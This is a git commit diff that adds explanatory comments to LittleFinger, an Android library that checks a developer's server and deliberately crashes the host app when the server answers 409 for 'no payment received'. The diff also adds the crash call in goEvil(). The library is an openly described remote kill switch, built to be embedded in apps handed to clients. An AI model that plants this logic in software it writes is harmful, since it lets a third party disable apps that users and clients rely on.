3e16b017c9ee1a947cdfc3fa716da3cfefd85fa7
avi <hi@avi.im>
2017-05-28 17:13:15 +0530

    Add comments

--- littlefinger/src/main/java/im/avi/littlefinger/LittleFinger.java
+++ littlefinger/src/main/java/im/avi/littlefinger/LittleFinger.java
@@ -18,19 +18,39 @@ import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.Response;
 
-
+/**
+ * LittleFinger makes the HTTP call to the server and decides what to do next based on the
+ * HTTP Response code and body
+ *
+ * If the response code is `HTTP_PAYMENT_REQUIRED` (402), then payment is expected to receive
+ * and let the work as usual
+ *
+ * If the response code is `HTTP_ACCEPTED` (202), then payment has been received. Update the flag
+ * in preferences so that no future network calls are made
+ *
+ * If the response code is `HTTP_CONFLICT` (409), no payment has been received and there is a
+ * conflict. Crash the app. If there is any notification data from server, use that and display a
+ * notification before crashing
+ *
+ * LittleFinger class is the one which is exposed to the developer. This class is responsible for
+ * making HTTP calls to server and deciding what to do based on the response. Internally, it makes
+ * use of CallbackHandler class which does all the heavy lifting
+ */
 public class LittleFinger {
 
     private static OkHttpClient client = new OkHttpClient();
 
     public static void init(Context ctx, String urlString) {
+        // Check whether to make call to server or not
         if (!Status.shouldMakeCall(ctx)) {
-            //
+            // looks like payment has been received. No calls to the server!
             return;
         }
         try {
             makeHttpCall(ctx, urlString);
         } catch (IOException ex) {
+            // In case of any exceptions, which might mostly be from HTTP connection, crash
+            // the app
             throw null;
         }
     }
@@ -67,18 +87,23 @@ class CallbackHandler implements Callback {
     private void responseHandler(Response response) {
         if (response.code() == HttpURLConnection.HTTP_PAYMENT_REQUIRED) {
             // do nothing
-            // we are waiting for payment, hence let the app work as expected
+            // we are waiting for the payment, hence let the app work as expected
         } else if (response.code() == HttpURLConnection.HTTP_ACCEPTED) {
             // received the payment
             // disable HTTP calls
             Status.cancelCall(mContext);
-        } else if (response.code() == HttpURLConnection.HTTP_CONFLICT){
+        } else if (response.code() == HttpURLConnection.HTTP_CONFLICT) {
             // no payment received
             // time to crash the app
             goEvil(response);
         }
     }
 
+
+    /**
+     * This method crashes the app. If the server has sent Notificatoin data, it uses that to
+     * display notification and then crash
+     */
     private void goEvil(Response response) {
         try {
             String jsonData = response.body().string();
@@ -87,6 +112,8 @@ class CallbackHandler implements Callback {
         } catch (IOException | JSONException ex) {
             // Don't do anything
         }
+        // crash the app
+        throw null;
     }
 
     private void displayNotification() {
@@ -105,29 +132,48 @@ class CallbackHandler implements Callback {
 }
 
 
+/**
+ * This is a helper class which makes use of Utils class. A thin wrapper.
+ */
 class Status {
     private static final String PREF_SHOULD_CALL = "should_call";
 
+    /**
+     * Checks if the the app should make HTTP call to server? If the value isn't set in Shared
+     * Preferences, True so that HTTP call can be made
+     */
     static boolean shouldMakeCall(Context ctx) {
-        return Boolean.valueOf(Utils.readSharedSetting(ctx,
-                PREF_SHOULD_CALL, "true"));
+        return Boolean.valueOf(Utils.readSharedSetting(ctx, PREF_SHOULD_CALL, "true"));
     }
 
+    /**
+     * Once the payment is received, it is no longer required to make calls to server. This
+     * method updates the Shared Preferences
+     */
     static void cancelCall(Context ctx) {
         Utils.saveSharedSetting(ctx, PREF_SHOULD_CALL, "false");
     }
 }
 
-
+/**
+ * Utility class to deal with Shared App Preferences
+ */
 class Utils {
 
     private static final String PREFERENCES_FILE = "little_finger_settings";
 
+    /**
+     * Given a key and default value, returns the value from Shared Preferences.
+     * If the key isn't set, returns the default value
+     */
     static String readSharedSetting(Context ctx, String settingName, String defaultValue) {
         SharedPreferences sharedPref = ctx.getSharedPreferences(PREFERENCES_FILE, Context.MODE_PRIVATE);
         return sharedPref.getString(settingName, defaultValue);
     }
 
+    /**
+     * Given a key and value, sets the value in the Shared Preferences
+     */
     static void saveSharedSetting(Context ctx, String settingName, String settingValue) {
         SharedPreferences sharedPref = ctx.getSharedPreferences(PREFERENCES_FILE, Context.MODE_PRIVATE);
         SharedPreferences.Editor editor = sharedPref.edit();
